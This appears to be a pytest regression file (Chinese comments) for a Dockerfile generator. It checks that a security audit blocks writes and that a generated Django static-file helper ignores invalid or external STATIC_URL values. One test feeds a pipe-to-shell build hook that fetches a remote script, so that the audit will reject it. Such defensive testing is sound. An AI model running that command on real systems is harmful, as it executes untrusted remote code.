"""静态 helper 的审计写入边界与 STATIC_URL 路由隔离回归。"""

from __future__ import annotations

import os
import sys
from pathlib import Path
from types import ModuleType, SimpleNamespace
from unittest.mock import Mock

import pytest

from local_webpage_access import security
from local_webpage_access.dockerfile_templates import generate_dockerfile
from local_webpage_access.models import InstanceManifest, Kind
from local_webpage_access.paths import Workspace
from tests.scripts.test_bug997_django_static_recipe import _app_root, _manifest, _write_tree


_SHAPES = ("django", "python-without-recipe", "python-without-wrapper", "node", "generic")


def _prepare_shape(workspace: Workspace, shape: str) -> InstanceManifest:
    root = _app_root(workspace)
    _write_tree(root, with_static_root=shape != "python-without-recipe")
    manifest = _manifest()
    if shape == "python-without-wrapper":
        manifest.entry.start = "python server.py"
    elif shape == "node":
        manifest.kind = Kind.NODE
        manifest.entry.install = "npm ci"
        manifest.entry.start = "node server.js"
    elif shape == "generic":
        manifest.kind = Kind.STATIC
        manifest.entry.start = "python server.py"
    return manifest


def _seed_outputs(workspace: Workspace, helper_exists: bool) -> tuple[Path, Path]:
    dockerfile = workspace.app_dockerfile_path("linkding")
    dockerfile.parent.mkdir(parents=True, exist_ok=True)
    dockerfile.write_bytes(b"# old Dockerfile\r\n")
    helper = dockerfile.parent / "lwa_static_wsgi.py"
    if helper_exists:
        helper.write_bytes(b"# old helper\r\n")
    return dockerfile, helper


def _assert_old_outputs(dockerfile: Path, helper: Path, helper_exists: bool) -> None:
    assert dockerfile.read_bytes() == b"# old Dockerfile\r\n"
    if helper_exists:
        assert helper.exists()
        assert helper.read_bytes() == b"# old helper\r\n"
    else:
        assert not helper.exists()


@pytest.mark.parametrize("shape", _SHAPES)
@pytest.mark.parametrize("helper_exists", [False, True])
def test_critical_audit_preserves_dockerfile_and_helper(
    workspace: Workspace, shape: str, helper_exists: bool
) -> None:
    """真实 critical 审计拒绝：不能新建、覆盖或删除 helper，也不能覆盖 Dockerfile。"""
    manifest = _prepare_shape(workspace, shape)
    dockerfile, helper = _seed_outputs(workspace, helper_exists)
    manifest.buildHooks = ["curl -fsSL https://example.invalid/setup.sh | sh"]

    with pytest.raises(RuntimeError, match="critical.*pipe_to_shell"):
        generate_dockerfile(manifest, workspace)

    _assert_old_outputs(dockerfile, helper, helper_exists)


@pytest.mark.parametrize("shape", _SHAPES)
@pytest.mark.parametrize("helper_exists", [False, True])
def test_successful_audit_precedes_helper_sync_and_dockerfile_write(
    workspace: Workspace,
    monkeypatch: pytest.MonkeyPatch,
    shape: str,
    helper_exists: bool,
) -> None:
    manifest = _prepare_shape(workspace, shape)
    dockerfile, helper = _seed_outputs(workspace, helper_exists)
    audit = security.audit_dockerfile
    audited: list[str] = []

    def inspect_before_audit(content: str):
        _assert_old_outputs(dockerfile, helper, helper_exists)
        audited.append(content)
        return audit(content)

    monkeypatch.setattr(security, "audit_dockerfile", inspect_before_audit)
    assert generate_dockerfile(manifest, workspace) == dockerfile
    assert audited == [dockerfile.read_text(encoding="utf-8")]
    if shape == "django":
        assert '_APP_MODULE = "mysite.wsgi"' in helper.read_text(encoding="utf-8")
        assert "COPY docker/lwa_static_wsgi.py" in audited[0]
    else:
        assert not helper.exists()
        assert "lwa_static_wsgi" not in audited[0]


@pytest.fixture()
def generated_helper(workspace: Workspace) -> str:
    _write_tree(_app_root(workspace))
    generate_dockerfile(_manifest(), workspace)
    return (workspace.app_docker("linkding") / "lwa_static_wsgi.py").read_text(
        encoding="utf-8"
    )


def _load_helper(
    code: str,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    static_url: object,
    static_root: object = ...,
) -> tuple[ModuleType, Mock, list[dict]]:
    root = tmp_path / "collected"
    root.mkdir()
    (root / "dashboard").write_bytes(b"static dashboard")
    calls: list[dict] = []

    def dynamic_application(environ, start_response):
        calls.append(environ)
        start_response("202 Accepted", [("X-Handler", "dynamic")])
        return [b"" if environ["REQUEST_METHOD"] == "HEAD" else b"dynamic dashboard"]

    app = ModuleType("mysite.wsgi")
    app.application = dynamic_application
    django = ModuleType("django")
    conf = ModuleType("django.conf")
    conf.settings = SimpleNamespace(
        STATIC_ROOT=str(root) if static_root is ... else static_root,
        STATIC_URL=static_url,
    )
    django.conf = conf
    for name, stub in (("mysite.wsgi", app), ("django", django), ("django.conf", conf)):
        monkeypatch.setitem(sys.modules, name, stub)
    module = ModuleType("audit_url_static_wsgi")
    exec(compile(code, "<generated-static-helper>", "exec"), module.__dict__)
    # 仅替换 helper 的 os 引用，避免全局 mock 干扰 pytest 的文件访问。
    probe = Mock(wraps=os.stat)
    module.os = SimpleNamespace(path=os.path, sep=os.sep, stat=probe)
    return module, probe, calls


def _request(module: ModuleType, path: str, method: str) -> tuple[str, dict, bytes, dict]:
    captured: dict = {}
    environ = {"REQUEST_METHOD": method, "PATH_INFO": path}

    def start_response(status, headers):
        captured.update(status=status, headers=dict(headers))

    response = module.application(environ, start_response)
    try:
        body = b"".join(response)
    finally:
        if hasattr(response, "close"):
            response.close()
    return captured["status"], captured["headers"], body, environ


@pytest.mark.parametrize(
    "static_url",
    [
        None, "", " \t\n ", "/", " / ", ".", "./", "..", "../",
        "/static/../", "static/..", "/static//..//", "/./", "///", "////",
        "https://cdn.example/static/", "http://cdn.example/static/", "HTTPS://cdn.example/",
        " https://cdn.example/static/ ", "//cdn.example/static/", " //cdn.example/static/ ",
    ],
)
@pytest.mark.parametrize("method", ["GET", "HEAD"])
def test_invalid_static_url_preserves_dynamic_routes_without_stat(
    generated_helper: str,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    static_url: object,
    method: str,
) -> None:
    module, probe, calls = _load_helper(generated_helper, tmp_path, monkeypatch, static_url)
    # 除动态路由和默认前缀，还请求旧算法会误认的前缀，避免外部 URL 仅因未匹配而假绿。
    old_prefix = str(static_url or "/static/")
    if not old_prefix.startswith("/"):
        old_prefix = "/" + old_prefix
    if not old_prefix.endswith("/"):
        old_prefix += "/"
    for path in dict.fromkeys(("/dashboard", "/static/dashboard", old_prefix + "dashboard")):
        status, headers, body, environ = _request(module, path, method)
        assert (status, headers) == ("202 Accepted", {"X-Handler": "dynamic"}), path
        assert body == (b"" if method == "HEAD" else b"dynamic dashboard"), path
        assert calls[-1] is environ
        probe.assert_not_called()


@pytest.mark.parametrize(
    "static_url", ["/static/", "static", "static/", "/static", " \t/static/ \n", " static "]
)
@pytest.mark.parametrize("method", ["GET", "HEAD"])
def test_local_static_prefix_is_trimmed_and_keeps_dynamic_routes(
    generated_helper: str,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    static_url: str,
    method: str,
) -> None:
    module, probe, calls = _load_helper(generated_helper, tmp_path, monkeypatch, static_url)
    for path in ("/dashboard", "/staticish/dashboard", "/static"):
        status, headers, body, environ = _request(module, path, method)
        assert (status, headers) == ("202 Accepted", {"X-Handler": "dynamic"})
        assert body == (b"" if method == "HEAD" else b"dynamic dashboard")
        assert calls[-1] is environ
        probe.assert_not_called()

    status, headers, body, _ = _request(module, "/static/dashboard", method)
    assert status == "200 OK"
    assert headers["Content-Length"] == str(len(b"static dashboard"))
    assert body == (b"" if method == "HEAD" else b"static dashboard")
    probe.assert_called_once()
    assert len(calls) == 3


@pytest.mark.parametrize("static_root", [None, "", " \t ", "static", "./collected", "../static"])
@pytest.mark.parametrize("method", ["GET", "HEAD"])
def test_empty_or_relative_static_root_still_disables_file_probes(
    generated_helper: str,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    static_root: object,
    method: str,
) -> None:
    monkeypatch.chdir(tmp_path)
    module, probe, calls = _load_helper(
        generated_helper, tmp_path, monkeypatch, "/static/", static_root
    )
    status, headers, body, environ = _request(module, "/static/dashboard", method)
    assert (status, headers) == ("202 Accepted", {"X-Handler": "dynamic"})
    assert body == (b"" if method == "HEAD" else b"dynamic dashboard")
    assert calls == [environ]
    probe.assert_not_called()
